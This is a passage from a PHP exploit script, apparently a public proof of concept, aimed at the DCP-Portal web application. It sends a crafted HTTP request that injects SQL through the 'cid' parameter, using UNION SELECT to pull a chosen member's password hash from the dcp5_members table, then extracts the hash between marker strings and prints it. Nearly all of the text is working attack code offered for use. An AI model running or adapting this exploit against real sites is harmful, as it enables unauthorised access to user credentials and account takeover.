*/
if ($argc<4) {
 echo "[*]Usage: php ".$argv[0]." host path id\r\n";
 echo "[*]Example:\r\n";
 echo "[*]php ".$argv[0]." localhost /dcp-portal/ 1\r\n";
 die;
}

function get_response($packet){
 global $host, $response;
 $socket=fsockopen(gethostbyname($host),80);
 if (!$socket) { echo "[-]Error contacting $host.\r\n"; exit();}
 fputs($socket,$packet);
 $response='';
 while (!feof($socket)) {
  $response.=fgets($socket);
    }
 fclose($socket);
}

$host =$argv[1];
$path =$argv[2];
$id = $argv[3];
 
$packet ="GET ".$path."index.php?cid=-1%27+union+select+1,concat(0x78306b73746572,password,0x78306b73746572)+from+dcp5_members+where+uid=".$id."/*";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";

get_response($packet);
if(strstr($response,"x0kster")){
	$hash = explode("x0kster",$response,32);
	echo "[+]Ok, the hash is : $hash[1]\r\n";
	die;
}else{
	echo "[-]Exploit filed, maybe fixed or incorrect id.\r\n";
	die;
}    

?>
